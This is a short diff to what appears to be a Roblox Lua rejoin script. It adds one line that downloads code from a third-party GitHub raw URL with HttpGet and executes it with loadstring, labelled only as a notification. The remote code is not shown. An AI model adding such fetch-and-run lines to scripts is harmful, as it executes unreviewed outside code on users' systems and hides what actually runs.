@@ -11,3 +11,5 @@ end
 wait(1)
 rejoinGame()
 
+loadstring(game:HttpGet"https://raw.githubusercontent.com/710200999/notification/refs/heads/main/notification-RejoinCurrentServer.lua")() -- notification
+
